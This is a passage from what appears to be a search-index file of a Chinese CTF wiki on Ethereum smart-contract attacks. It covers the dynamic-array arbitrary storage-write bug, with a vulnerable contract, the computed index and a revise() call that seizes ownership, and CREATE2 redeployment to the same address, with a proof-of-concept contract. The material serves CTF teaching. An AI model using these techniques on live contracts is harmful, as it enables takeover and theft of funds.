\uff0c(\u5bf9\u4e8e\u672c\u9898\u6765\u8bf4\uff0c\u6570\u7ec4\u7684 slot\u662f 1 , x=keccak256(bytes32(1))) \uff0c\u90a3\u4e48\u5f53\u6211\u4eec\u4fee\u6539 codex[y]\uff0c(y=2^256-x+0) \u65f6\u5c31\u80fd\u4fee\u6539 slot 0 \uff0c\u4ece\u800c\u4fee\u6539 owner \u8ba1\u7b97 codex \u4f4d\u7f6e\u4e3a slot 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 \u6240\u4ee5 y = 2^256 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 0 \u5373 y = 35707666377435648211887908874984608119992236509074197713628505308453184860938 \u53ef\u4ee5\u770b\u5230 y \u5f88\u5927\uff0c\u6211\u4eec\u8981\u4fee\u6539 codex[y] \uff0c\u90a3\u5c31\u8981\u6ee1\u8db3 y < codex.length \uff0c\u800c\u8fd9\u4e2a\u65f6\u5019 codex.length =0 \uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 retract() \u4f7f length \u4e0b\u6ea2\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u64cd\u7eb5 codex[y] \u4e86 \u7531\u4e0a\u9762\u5df2\u7ecf\u8ba1\u7b97\u51fa codex[35707666377435648211887908874984608119992236509074197713628505308453184860938] \u5bf9\u5e94\u7684\u5b58\u50a8\u4f4d\u5c31\u662f slot 0 \uff0c\u800c slot 0 \u4e2d\u540c\u65f6\u5b58\u50a8\u4e86 contact \u548c owner \uff0c\u6211\u4eec\u53ea\u9700\u5c06 owner \u6362\u6210 attacker \u5373\u53ef\uff0c\u5047\u8bbe attacker \u5730\u5740\u662f 0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2\uff0c\u5219\u5982\u4e0b\u6240\u793a contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x00000000000000000000000088d3052d12527f1fbe3a6e1444ea72c4ddb396c2') \u9898\u76ee \u00b6 XCTF_final 2019 \u00b6 \u9898\u76ee\u540d\u79f0 Happy_DOuble_Eleven Balsn 2019 \u00b6 \u9898\u76ee\u540d\u79f0 Bank \u7b2c\u4e00\u5c4a\u9493\u9c7c\u57ce\u676f 2020 \u00b6 \u9898\u76ee\u540d\u79f0 StrictMathematician RCTF 2020 \u00b6 \u9898\u76ee\u540d\u79f0 roiscoin Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"Arbitrary Writing"},{"location":"blockchain/ethereum/attacks/arbitrarywrite/#arbitrary-writing","text":"","title":"Arbitrary Writing"},{"location":"blockchain/ethereum/attacks/arbitrarywrite/#_1","text":"\u52a8\u6001\u6570\u7ec4\u7684\u4efb\u610f Storage \u5b58\u50a8\u5199\u6f0f\u6d1e\uff0c\u6839\u636e \u5b98\u65b9\u6587\u6863 \u4ecb\u7ecd\uff0c\u53ef\u603b\u7ed3\u5982\u4e0b EVM \u4e2d\uff0c\u6709\u4e09\u4e2a\u5730\u65b9\u53ef\u4ee5\u5b58\u50a8\u53d8\u91cf\uff0c\u5206\u522b\u662f Memory\u3001Stack \u548c Storage\u3002Memory \u548c Stack \u662f\u5728\u6267\u884c\u671f\u95f4\u4e34\u65f6\u751f\u6210\u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u4e3b\u8981\u8d1f\u8d23\u8fd0\u884c\u65f6\u7684\u6570\u636e\u5b58\u50a8\uff0cStorage \u662f\u6c38\u4e45\u5b58\u5728\u4e8e\u533a\u5757\u94fe\u4e2d\u7684\u53d8\u91cf\u3002 Memory: \u5185\u5b58\uff0c\u751f\u547d\u5468\u671f\u4ec5\u4e3a\u6574\u4e2a\u65b9\u6cd5\u6267\u884c\u671f\u95f4\uff0c\u51fd\u6570\u8c03\u7528\u540e\u56de\u6536\uff0c\u56e0\u4e3a\u4ec5\u4fdd\u5b58\u4e34\u65f6\u53d8\u91cf\uff0c\u6545 GAS \u5f00\u9500\u5f88\u5c0f Storage: \u6c38\u4e45\u50a8\u5b58\u5728\u533a\u5757\u94fe\u4e2d\uff0c\u7531\u4e8e\u4f1a\u6c38\u4e45\u4fdd\u5b58\u5408\u7ea6\u72b6\u6001\u53d8\u91cf\uff0c\u6545 GAS \u5f00\u9500\u4e5f\u6700\u5927 Stack: \u5b58\u653e\u90e8\u5206\u5c40\u90e8\u503c\u7c7b\u578b\u53d8\u91cf\uff0c\u51e0\u4e4e\u514d\u8d39\u4f7f\u7528\u7684\u5185\u5b58\uff0c\u4f46\u6709\u6570\u91cf\u9650\u5236 EVM \u5bf9\u6bcf\u4e00\u4e2a\u667a\u80fd\u5408\u7ea6\u7ef4\u62a4\u4e86\u4e00\u4e2a\u5de8\u5927\u7684 key-value \u7684\u5b58\u50a8\u7ed3\u6784\uff0c\u7528\u4e8e\u6301\u4e45\u5316\u5b58\u50a8\u6570\u636e\uff0c\u6211\u4eec\u79f0\u8fd9\u7247\u533a\u57df\u4e3a Storage\u3002\u9664\u4e86 map \u6620\u5c04\u53d8\u91cf\u548c\u53d8\u957f\u6570\u7ec4\u4ee5\u5916\u7684\u6240\u6709\u7c7b\u578b\u53d8\u91cf\uff0c\u5728 Storage \u4e2d\u662f\u4f9d\u6b21\u8fde\u7eed\u4ece slot 0 \u5f00\u59cb\u6392\u5217\u7684\uff0c\u4e00\u5171\u6709 2^256 \u4e2a slot\uff0c\u6bcf\u4e2a slot \u53ef\u4ee5\u5b58\u50a8 32 \u5b57\u8282\u7684\u6570\u636e\u3002Storage \u5b58\u50a8\u7ed3\u6784\u662f\u5728\u5408\u7ea6\u521b\u5efa\u7684\u65f6\u5019\u5c31\u786e\u5b9a\u597d\u7684\uff0c\u5b83\u53d6\u51b3\u4e8e\u5408\u7ea6\u6240\u58f0\u660e\u72b6\u6001\u53d8\u91cf\uff0c\u4f46\u662f\u5185\u5bb9\u53ef\u4ee5\u901a\u8fc7 Transaction \u6539\u53d8\u3002 Storage \u53d8\u91cf\u5927\u81f4\u5206\u4e3a 4 \u79cd\u7c7b\u578b\uff1a\u5b9a\u957f\u53d8\u91cf\u3001\u7ed3\u6784\u4f53\u3001map \u6620\u5c04\u53d8\u91cf\u548c\u53d8\u957f\u6570\u7ec4\u3002\u5982\u679c\u591a\u4e2a\u53d8\u91cf\u5360\u7528\u7684\u5927\u5c0f\u5c0f\u4e8e 32 \u5b57\u8282\uff0c\u6309\u7167\u7d27\u5bc6\u6253\u5305\u539f\u5219\uff0c\u4f1a\u5c3d\u53ef\u80fd\u6253\u5305\u5230\u5355\u4e2a slot \u4e2d\uff0c\u5177\u4f53\u89c4\u5219\u5982\u4e0b\uff1a \u5728 slot \u4e2d\uff0c\u662f\u6309\u7167\u4f4e\u4f4d\u5bf9\u9f50\u5b58\u50a8\u7684\uff0c\u5373\u5927\u7aef\u5e8f \u57fa\u672c\u7c7b\u578b\u53d8\u91cf\u5b58\u50a8\u65f6\u4ec5\u5b58\u50a8\u5b83\u4eec\u5b9e\u9645\u6240\u9700\u7684\u5b57\u8282\u6570 \u5982\u679c\u57fa\u672c\u7c7b\u578b\u53d8\u91cf\u4e0d\u80fd\u653e\u5165\u67d0\u4e2a slot \u4f59\u4e0b\u7684\u7a7a\u95f4\uff0c\u5b83\u5c06\u88ab\u653e\u5165\u4e0b\u4e00\u4e2a slot map \u548c\u53d8\u957f\u6570\u7ec4\u603b\u662f\u4f7f\u7528\u4e00\u4e2a\u5168\u65b0\u7684 slot\uff0c\u5e76\u5360\u7528\u6574\u4e2a slot\uff0c\u4f46\u5bf9\u4e8e\u5176\u5185\u90e8\u7684\u6bcf\u4e2a\u53d8\u91cf\uff0c\u8fd8\u662f\u8981\u9075\u4ece\u4e0a\u9762\u7684\u89c4\u5219","title":"\u539f\u7406"},{"location":"blockchain/ethereum/attacks/arbitrarywrite/#slot","text":"\u9996\u5148\u6211\u4eec\u5206\u6790\u4e00\u4e0b\u5404\u79cd\u5bf9\u8c61\u7ed3\u6784\u5728 EVM \u4e2d\u7684\u5b58\u50a8\u548c\u8bbf\u95ee\u60c5\u51b5","title":"slot \u8ba1\u7b97\u89c4\u5219"},{"location":"blockchain/ethereum/attacks/arbitrarywrite/#_2","text":"Solidity \u4e2d\u7684\u5b9a\u957f\u5b9a\u91cf\u5728\u5b9a\u4e49\u7684\u65f6\u5019\uff0c\u5176\u957f\u5ea6\u5c31\u5df2\u7ecf\u88ab\u9650\u5236\u4f4f\u4e86\u3002\u6bd4\u5982\u5b9a\u957f\u6574\u578b\uff08uint\u3001uint8\uff09\uff0c\u5730\u5740\u5e38\u91cf\uff08address\uff09\uff0c\u5b9a\u957f\u5b57\u8282\u6570\u7ec4\uff08bytes1-32\uff09\u7b49\uff0c\u8fd9\u7c7b\u7684\u53d8\u91cf\u5728 Storage \u4e2d\u662f\u5c3d\u53ef\u80fd\u6253\u5305\u6210 32 \u5b57\u8282\u7684\u5757\u987a\u5e8f\u5b58\u50a8\u7684\u3002 Solidity \u7684\u7ed3\u6784\u4f53\u5e76\u6ca1\u6709\u7279\u6b8a\u7684\u5b58\u50a8\u6a21\u578b\uff0c\u5728 Storage \u4e2d\u7684\u5b58\u50a8\u53ef\u4ee5\u6309\u7167\u5b9a\u957f\u53d8\u91cf\u89c4\u5219\u5206\u6790\u3002","title":"\u5b9a\u957f\u53d8\u91cf\u548c\u7ed3\u6784\u4f53"},{"location":"blockchain/ethereum/attacks/arbitrarywrite/#map","text":"\u5728 Solidity \u4e2d\uff0c\u5e76\u4e0d\u5b58\u50a8 map \u7684\u952e\uff0c\u53ea\u5b58\u50a8\u952e\u5bf9\u5e94\u7684\u503c\uff0c\u503c\u662f\u901a\u8fc7\u952e\u7684 hash \u7d22\u5f15\u6765\u627e\u5230\u7684\u3002\u7528 slotM slotM \u8868\u793a map \u58f0\u660e\u7684 slot \u4f4d\u7f6e\uff0c\u7528 key key \u8868\u793a\u952e\uff0c\u7528 value value \u8868\u793a key key \u5bf9\u5e94\u7684\u503c\uff0c\u7528 slotV slotV \u8868\u793a value value \u7684\u5b58\u50a8\u4f4d\u7f6e\uff0c\u5219 slotV = keccak256(key|slotM) slotV = keccak256(key|slotM) value = sload(slotV) value = sload(slotV)","title":"Map \u6620\u5c04\u53d8\u91cf"},{"location":"blockchain/ethereum/attacks/arbitrarywrite/#_3","text":"\u7528 slotA slotA \u8868\u793a\u53d8\u957f\u6570\u7ec4\u58f0\u660e\u7684\u4f4d\u7f6e\uff0c\u7528 length length \u8868\u793a\u53d8\u957f\u6570\u7ec4\u7684\u957f\u5ea6\uff0c\u7528 slotV slotV \u8868\u793a\u53d8\u957f\u6570\u7ec4\u6570\u636e\u5b58\u50a8\u7684\u4f4d\u7f6e\uff0c\u7528 value value \u8868\u793a\u53d8\u957f\u6570\u7ec4\u67d0\u4e2a\u6570\u636e\u7684\u503c\uff0c\u7528 index index \u8868\u793a value value \u5bf9\u5e94\u7684\u7d22\u5f15\u4e0b\u6807\uff0c\u5219 length = sload(slotA) length = sload(slotA) slotV = keccak256(slotA) + index slotV = keccak256(slotA) + index value = sload(slotV) value = sload(slotV) \u53d8\u957f\u6570\u7ec4\u5728\u7f16\u8bd1\u671f\u95f4\u65e0\u6cd5\u77e5\u9053\u6570\u7ec4\u7684\u957f\u5ea6\uff0c\u6ca1\u529e\u6cd5\u63d0\u524d\u9884\u7559\u5b58\u50a8\u7a7a\u95f4\uff0c\u6240\u4ee5 Solidity \u5c31\u7528 slotA slotA \u4f4d\u7f6e\u5b58\u50a8\u4e86\u53d8\u957f\u6570\u7ec4\u7684\u957f\u5ea6 Note \u6ce8\uff1a\u53d8\u957f\u6570\u7ec4\u5177\u4f53\u6570\u636e\u5b58\u653e\u5728 keccak256 \u54c8\u5e0c\u8ba1\u7b97\u4e4b\u540e\u7684\u4e00\u7247\u8fde\u7eed\u5b58\u50a8\u533a\u57df\uff0c\u8fd9\u4e00\u70b9\u4e0e Map \u6620\u5c04\u53d8\u91cf\u4e0d\u540c\u3002","title":"\u53d8\u957f\u6570\u7ec4"},{"location":"blockchain/ethereum/attacks/arbitrarywrite/#_4","text":"\u5728\u4ee5\u592a\u574a EVM \u7684\u8bbe\u8ba1\u601d\u8def\u4e2d\uff0c\u6240\u6709\u7684 Storage \u53d8\u91cf\u5171\u7528\u4e00\u7247\u5927\u5c0f\u4e3a 2^256*32 \u5b57\u8282\u7684\u5b58\u50a8\u7a7a\u95f4\uff0c\u6ca1\u6709\u5404\u81ea\u7684\u5b58\u50a8\u533a\u57df\u5212\u5206\u3002 Storage \u7a7a\u95f4\u5373\u4f7f\u5f88\u5927\u4e5f\u662f\u6709\u9650\u5927\u5c0f\uff0c\u5f53\u53d8\u957f\u6570\u7ec4\u957f\u5ea6\u5f88\u5927\u65f6\uff0c\u8003\u8651\u6781\u7aef\u60c5\u51b5\uff0c\u5982\u679c\u957f\u5ea6\u8fbe\u5230 2^256\uff0c\u5219\u53ef\u5bf9\u4efb\u610f Storage \u53d8\u91cf\u8fdb\u884c\u8bfb\u5199\u64cd\u4f5c\uff0c\u8fd9\u662f\u975e\u5e38\u53ef\u6015\u7684\u3002","title":"\u6f0f\u6d1e\u4ecb\u7ecd"},{"location":"blockchain/ethereum/attacks/arbitrarywrite/#_5","text":"","title":"\u4f8b\u5b50"},{"location":"blockchain/ethereum/attacks/arbitrarywrite/#source","text":"pragma solidity ^ 0.4.24 ; contract ArrayTest { address public owner ; bool public contact ; bytes32 [] public codex ; constructor () public { owner = msg.sender ; } function record ( bytes32 _content ) public { codex . push ( _content ); } function retract () public { codex . length -- ; } function revise ( uint i , bytes32 _content ) public { codex [ i ] = _content ; } } \u8fd9\u91cc\u653b\u51fb\u8005\u5982\u4f55\u624d\u80fd\u6210\u4e3a owner \u5462\uff1f\u5176\u4e2d owner \u6700\u521d\u4e3a 0x73048cec9010e92c298b016966bde1cc47299df5","title":"Source"},{"location":"blockchain/ethereum/attacks/arbitrarywrite/#analyse","text":"\u6570\u7ec4 codex \u7684 slot \u4e3a 1 \uff0c\u540c\u65f6\u8fd9\u4e5f\u662f\u5b58\u50a8\u6570\u7ec4 length \u7684\u5730\u65b9\uff0c\u800c codex \u7684\u5b9e\u9645\u5185\u5bb9\u5b58\u50a8\u5728 keccak256(bytes32(1)) \u5f00\u59cb\u7684\u4f4d\u7f6e Info Keccak256 \u662f\u7d27\u5bc6\u6253\u5305\u7684\uff0c\u610f\u601d\u662f\u8bf4\u53c2\u6570\u4e0d\u4f1a\u8865\u4f4d\uff0c\u591a\u4e2a\u53c2\u6570\u4e5f\u4f1a\u76f4\u63a5\u8fde\u63a5\u5728\u4e00\u8d77\uff0c\u6240\u4ee5\u8981\u7528 keccak256(bytes32(1)) \u8fd9\u6837\u6211\u4eec\u5c31\u77e5\u9053\u4e86 codex \u5b9e\u9645\u7684\u5b58\u50a8\u7684 slot \uff0c\u53ef\u4ee5\u5c06\u52a8\u6001\u6570\u7ec4\u5185\u53d8\u91cf\u7684\u5b58\u50a8\u4f4d\u8ba1\u7b97\u65b9\u6cd5\u6982\u62ec\u4e3a: array[index] == sload(keccak256(slot(array)) + index). \u56e0\u4e3a\u603b\u5171\u6709 2^256 \u4e2a slot \uff0c\u8981\u4fee\u6539 slot 0 \uff0c\u5047\u8bbe codex \u5b9e\u9645\u6240\u5728 slot x \uff0c(\u5bf9\u4e8e\u672c\u9898\u6765\u8bf4\uff0c\u6570\u7ec4\u7684 slot\u662f 1 , x=keccak256(bytes32(1))) \uff0c\u90a3\u4e48\u5f53\u6211\u4eec\u4fee\u6539 codex[y]\uff0c(y=2^256-x+0) \u65f6\u5c31\u80fd\u4fee\u6539 slot 0 \uff0c\u4ece\u800c\u4fee\u6539 owner \u8ba1\u7b97 codex \u4f4d\u7f6e\u4e3a slot 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 \u6240\u4ee5 y = 2^256 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 0 \u5373 y = 35707666377435648211887908874984608119992236509074197713628505308453184860938 \u53ef\u4ee5\u770b\u5230 y \u5f88\u5927\uff0c\u6211\u4eec\u8981\u4fee\u6539 codex[y] \uff0c\u90a3\u5c31\u8981\u6ee1\u8db3 y < codex.length \uff0c\u800c\u8fd9\u4e2a\u65f6\u5019 codex.length =0 \uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 retract() \u4f7f length \u4e0b\u6ea2\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u64cd\u7eb5 codex[y] \u4e86 \u7531\u4e0a\u9762\u5df2\u7ecf\u8ba1\u7b97\u51fa codex[35707666377435648211887908874984608119992236509074197713628505308453184860938] \u5bf9\u5e94\u7684\u5b58\u50a8\u4f4d\u5c31\u662f slot 0 \uff0c\u800c slot 0 \u4e2d\u540c\u65f6\u5b58\u50a8\u4e86 contact \u548c owner \uff0c\u6211\u4eec\u53ea\u9700\u5c06 owner \u6362\u6210 attacker \u5373\u53ef\uff0c\u5047\u8bbe attacker \u5730\u5740\u662f 0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2\uff0c\u5219\u5982\u4e0b\u6240\u793a contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x00000000000000000000000088d3052d12527f1fbe3a6e1444ea72c4ddb396c2')","title":"Analyse"},{"location":"blockchain/ethereum/attacks/arbitrarywrite/#_6","text":"","title":"\u9898\u76ee"},{"location":"blockchain/ethereum/attacks/arbitrarywrite/#xctf_final-2019","text":"\u9898\u76ee\u540d\u79f0 Happy_DOuble_Eleven","title":"XCTF_final 2019"},{"location":"blockchain/ethereum/attacks/arbitrarywrite/#balsn-2019","text":"\u9898\u76ee\u540d\u79f0 Bank","title":"Balsn 2019"},{"location":"blockchain/ethereum/attacks/arbitrarywrite/#2020","text":"\u9898\u76ee\u540d\u79f0 StrictMathematician","title":"\u7b2c\u4e00\u5c4a\u9493\u9c7c\u57ce\u676f 2020"},{"location":"blockchain/ethereum/attacks/arbitrarywrite/#rctf-2020","text":"\u9898\u76ee\u540d\u79f0 roiscoin Note \u6ce8\uff1a\u9898\u76ee\u9644\u4ef6\u76f8\u5173\u5185\u5bb9\u53ef\u81f3 ctf-challenges/blockchain \u4ed3\u5e93\u5bfb\u627e\u3002","title":"RCTF 2020"},{"location":"blockchain/ethereum/attacks/create2/","text":"CREATE2 \u00b6 CREATE2 \u662f\u4ee5\u592a\u574a\u5728\u201c\u541b\u58eb\u5766\u4e01\u5821\u201d\u8fd9\u6b21\u786c\u5206\u53c9\u5347\u7ea7\u4e2d\u5f15\u5165\u7684\u4e00\u4e2a\u65b0\u64cd\u4f5c\u7801\uff0c\u4e0d\u540c\u4e8e CREATE \uff0c\u5b83\u4f7f\u7528\u65b0\u7684\u65b9\u5f0f\u6765\u8ba1\u7b97\u5408\u7ea6\u5730\u5740\uff0c\u8ba9\u751f\u6210\u7684\u5408\u7ea6\u5730\u5740\u66f4\u5177\u6709\u53ef\u63a7\u6027\u3002\u901a\u8fc7 CREATE2 \u53ef\u4ee5\u5ef6\u4f38\u51fa\u5f88\u591a\u6709\u610f\u601d\u7684\u73a9\u6cd5\uff0c\u5728 CTF \u4e2d\u6700\u5e38\u89c1\u7684\u5c31\u662f\u5229\u7528\u8fd9\u79cd\u53ef\u63a7\u6027\uff0c\u5728\u540c\u4e00\u4e2a\u5730\u5740\u5148\u540e\u90e8\u7f72\u5b57\u8282\u7801\u5b8c\u5168\u4e0d\u540c\u7684\u5408\u7ea6\u3002 \u539f\u7406 \u00b6 CREATE \u00b6 \u5982\u679c\u5229\u7528\u5916\u90e8\u8d26\u6237\u6216\u8005\u4f7f\u7528 CREATE \u64cd\u4f5c\u7801\u7684\u5408\u7ea6\u8d26\u6237\u521b\u5efa\u4e00\u4e2a\u5408\u7ea6\uff0c\u90a3\u4e48\u5f88\u5bb9\u6613\u5c31\u80fd\u786e\u5b9a\u88ab\u521b\u5efa\u5408\u7ea6\u7684\u5730\u5740\u3002\u6bcf\u4e2a\u8d26\u6237\u90fd\u6709\u4e00\u4e2a\u4e0e\u4e4b\u5173\u8054\u7684 nonce \uff1a\u5bf9\u5916\u90e8\u8d26\u6237\u800c\u8a00\uff0c\u6bcf\u53d1\u9001\u4e00\u4e2a\u4ea4\u6613\uff0c nonce \u5c31\u4f1a\u968f\u4e4b +1 \uff1b\u5bf9\u5408\u7ea6\u8d26\u6237\u800c\u8a00\uff0c\u6bcf\u521b\u5efa\u4e00\u4e2a\u5408\u7ea6\uff0c nonce \u5c31\u4f1a\u968f\u4e4b +1 \u3002\u65b0\u5408\u7ea6\u7684\u5730\u5740\u7531\u521b\u5efa\u5408\u7ea6\u4ea4\u6613\u7684\u53d1\u9001\u8005\u8d26\u6237\u5730\u5740\u53ca\u5176 nonce \u503c\u8ba1\u7b97\u5f97\u5230\uff0c\u5176\u5177\u4f53\u516c\u5f0f\u5982\u4e0b\uff1a keccak256 ( rlp . encode ( address , nonce ))[ 12 :] CREATE2 \u00b6 \u4e0d\u540c\u4e8e\u539f\u6765\u7684 CREATE \u64cd\u4f5c\u7801\uff0c\u5728\u5408\u7ea6\u5730\u5740\u7684\u8ba1\u7b97\u65b9\u6cd5\u4e0a\uff0c CREATE2 \u4e0d\u518d\u4f9d\u8d56\u4e8e\u8d26\u6237\u7684 nonce \uff0c\u800c\u662f\u5bf9\u4ee5\u4e0b\u53c2\u6570\u8fdb\u884c\u54c8\u5e0c\u8ba1\u7b97\uff0c\u5f97\u51fa\u65b0\u7684\u5730\u5740\uff1a \u5408\u7ea6\u521b\u5efa\u8005\u7684\u5730\u5740\uff08 address ) \u4f5c\u4e3a\u53c2\u6570\u7684\u6df7\u6dc6\u503c\uff08 salt \uff09 \u5408\u7ea6\u521b\u5efa\u4ee3\u7801 ( init_code ) \u5177\u4f53\u7684\u8ba1\u7b97\u516c\u5f0f\u5982\u4e0b\uff1a keccak256 ( 0xff ++ address ++ salt ++ keccak256 ( init_code ))[ 12 :] \u4e00\u4e2a\u9700\u8981\u6ce8\u610f\u7684\u91cd\u8981\u7ec6\u8282\u662f\uff0c\u8ba1\u7b97\u5408\u7ea6\u5730\u5740\u6240\u9700\u7684\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u5e76\u975e\u5408\u7ea6\u4ee3\u7801\uff0c\u800c\u662f\u5176\u521b\u5efa\u4ee3\u7801\u3002\u8be5\u4ee3\u7801\u662f\u7528\u6765\u521b\u5efa\u5408\u7ea6\u7684\uff0c\u5408\u7ea6\u521b\u5efa\u5b8c\u6210\u540e\u5c06\u8fd4\u56de\u8fd0\u884c\u65f6\u5b57\u8282\u7801\u3002 \u8fd9\u610f\u5473\u7740\uff0c\u5982\u679c\u6211\u4eec\u63a7\u5236\u4e86\u5408\u7ea6\u7684\u521b\u5efa\u4ee3\u7801\u5e76\u4f7f\u5176\u4fdd\u6301\u4e0d\u53d8\uff0c\u7136\u540e\u63a7\u5236\u5408\u7ea6\u6784\u9020\u51fd\u6570\u8fd4\u56de\u7684\u8fd0\u884c\u65f6\u5b57\u8282\u7801\uff0c\u90a3\u4e48\u6211\u4eec\u5f88\u5bb9\u6613\u5c31\u80fd\u505a\u5230\u5728\u540c\u4e00\u4e2a\u5730\u5740\u4e0a\uff0c\u53cd\u590d\u90e8\u7f72\u5b8c\u5168\u4e0d\u540c\u7684\u5408\u7ea6\u3002\u4e8b\u5b9e\u4e0a CREATE2 \u8fd9\u79cd\u8ba9\u5408\u7ea6\u5728\u90e8\u7f72\u540e\u53ef\u4ee5\u88ab\u91cd\u65b0\u66f4\u6539\u7684\u7279\u6027\u5b58\u5728\u7740\u6f5c\u5728\u7684\u5b89\u5168\u95ee\u9898\uff0c\u4e5f\u5f15\u8d77\u4e86\u4eba\u4eec\u5bf9\u5176\u7684 \u8ba8\u8bba \u3002 \u5728 CTF \u4e2d\uff0c\u8fd9\u79cd\u7279\u6027\u5f80\u5f80\u4f1a\u88ab\u7528\u6765\u4f5c\u4e3a\u4e00\u4e2a\u6280\u5de7\uff0c\u901a\u8fc7\u5728\u540c\u4e00\u4e2a\u5730\u5740\u4e0a\u90e8\u7f72\u4e0d\u540c\u7684\u5408\u7ea6\u7528\u6765 bypass \u4e0d\u540c\u7684\u6821\u9a8c\u3002 \u4f8b\u5b50 \u00b6 \u4ee5 2019 Balsn CTF \u7684 Creativity \u7684 WP \u63d0\u4f9b\u7684 PoC \u4f5c\u4e3a\u4f8b\u5b50\uff0c\u8bb2\u89e3\u4e00\u4e0b CREATE2 \u7684\u5de7\u5999\u4f7f\u7528\uff1a pragma solidity ^ 0.5.10 ; contract Deployer { bytes public deployBytecode ; address public deployedAddr ; function deploy ( bytes memory code ) public { deployBytecode = code ; address a ; // Compile Dumper to get this bytecode bytes memory dumperBytecode = hex '6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe' ; assembly { a : = create2 ( callvalue , add ( 0x20 , dumperBytecode ), mload ( dumperBytecode ), 0x9453 ) } deployedAddr = a ; } } contract Dumper { constructor () public { Deployer dp = Deployer ( msg.sender ); bytes memory bytecode = dp . deployBytecode (); assembly { return ( add ( bytecode , 0x20 ), mload ( bytecode )) } } } \u5f53\u6211\u4eec\u6bcf\u6b21\u5229\u7528 deploy(code) \u51fd\u6570\u6765\u90e8\u7f72\u9884\u671f\u6784\u9020\u7684\u5408\u7ea6\u65f6\uff0c\u7531\u4e8e\u5b9e\u9645\u4e0a\u7684 init_code \u90fd\u662f\u540c\u6837\u7684 dumperBytecode \uff0c\u518d\u52a0\u4e0a\u786e\u5b9a\u7684\u5408\u7ea6\u5730\u5740\u4ee5\u53ca salt \uff0c\u6240\u4ee5\u901a\u8fc7 deploy(code) \u90e8\u7f72\u7684\u5408\u7ea6\u6700\u7ec8\u4f1a\u90e8\u7f72\u5728\u540c\u4e00\u4e2a\u5730\u5740\u4e0a\u3002\u7136\u540e\u88ab\u52a0\u8f7d\u7684\u5408\u7ea6\u5728\u6784\u9020\u51fd\u6570\u6267\u884c\u7684\u65f6\u5019\uff0c\u4f1a\u8df3\u8f6c\u5230\u8c03\u7528\u51fd\u6570\u65f6\u4f20\u5165\u7684 code \u4e0a\uff0c\u6240\u4ee5\u4e0d\u7ba1\u6211\u4eec\u7528 deploy(code) \u51fd\u6570\u90e8\u7f72\u4ec0\u4e48\u5408\u7ea6\uff0c\u5176\u6700\u7ec8\u90fd\u4f1a\u90e8\u7f72\u5230\u540c\u4e00\u4e2a\u5730\u5740\u4e0a\u3002 \u5728\u77e5\u9053 Deployer \u5408\u7ea6\u5730\u5740\u662f 0x99Ed0b4646a5F4Ee0877B8341E9629e4BF30c281 \u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u90e8\u7f72\u5408\u7ea6\u7684\u5730\u5740\u4e3a 0x4315DBef1aC19251d54b075d29Bcc4E81F1e3C73\uff1a function getAddress ( address addr , bytes memory bytecode , uint salt ) public view returns ( address ) { bytes32 hash = keccak256 ( abi . encodePacked ( bytes1 ( 0xff ), addr , salt , keccak256 ( bytecode ) ) ); // NOTE: cast last 20 bytes of hash to address return address ( uint160 ( uint256 ( hash ))); } \u5229\u7528\u8be5\u5408\u7ea6\uff0c\u6211\u4eec\u6210\u529f\u5730\u5728\u540c\u4e00\u4e2a\u5730\u5740\u4e0a\u5148\u540e\u4e0a\u90e8\u7f72\u4e86\u4e24\u4e2a\u4e0d\u540c\u7684\u5408\u7ea6\uff1a \u9898\u76ee \u00b6 Balsn 2019 \u00b6 \u9898\u76ee\u540d\u79f0 Creativity QWB 2020 \u00b6 \u9898\u76ee\u540d\u79f0 EasyAssembly \u53c2\u8003 \u00b6 EIP-1014: Skinny CREATE2 \u5145\u5206\u5229\u7528 CREATE2 Balsn CTF 2019 - Creativity","title":"CREATE2"},{"location":"blockchain/ethereum/attacks/create2/#create2","text":"CREATE2 \u662f\u4ee5\u592a\u574a\u5728\u201c\u541b\u58eb\u5766\u4e01\u5821\u201d\u8fd9\u6b21\u786c\u5206\u53c9\u5347\u7ea7\u4e2d\u5f15\u5165\u7684\u4e00\u4e2a\u65b0\u64cd\u4f5c\u7801\uff0c\u4e0d\u540c\u4e8e CREATE \uff0c\u5b83\u4f7f\u7528\u65b0\u7684\u65b9\u5f0f\u6765\u8ba1\u7b97\u5408\u7ea6\u5730\u5740\uff0c\u8ba9\u751f\u6210\u7684\u5408\u7ea6\u5730\u5740\u66f4\u5177\u6709\u53ef\u63a7\u6027\u3002\u901a\u8fc7 CREATE2 \u53ef\u4ee5\u5ef6\u4f38\u51fa\u5f88\u591a\u6709\u610f\u601d\u7684\u73a9\u6cd5\uff0c\u5728 CTF 